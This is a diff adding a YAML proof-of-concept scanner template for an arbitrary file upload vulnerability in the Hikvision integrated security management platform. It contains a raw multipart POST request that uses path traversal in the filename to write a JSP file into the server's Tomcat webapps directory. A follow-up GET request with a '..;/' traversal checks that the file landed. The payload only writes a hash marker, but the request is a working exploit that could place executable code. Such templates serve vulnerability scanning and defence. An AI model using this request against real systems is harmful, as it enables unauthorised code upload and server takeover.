@@ -1,0 +1,20 @@
+id: poc-yaml-HIKVISION-comprehensive-security-management-platform-report-file-upload
+info:
+  name: 海康威视 综合安防管理平台 report 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: HiKVISION 综合安防管理平台
+variables:
+  t1: random_str(8)
+  t2: md5(t1)
+requests:
+- raw: "POST /svm/api/external/report HTTP/1.1\nHost: \nContent-Type: multipart/form-data;\
+    \ boundary=----WebKitFormBoundary9PggsiM755PLa54a\nContent-Length: 304\n\n------WebKitFormBoundary9PggsiM755PLa54a\n\
+    Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/{{.t1}}.jsp\"\
+    \nContent-Type: application/zip\n\n{{.t2}}\n\n------WebKitFormBoundary9PggsiM755PLa54a--"
+  expression: status_code == 200 && contains(body,"\"data\":null") && contains(body,"msg")
+- method: GET
+  path: /portal/ui/login/..;/..;/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
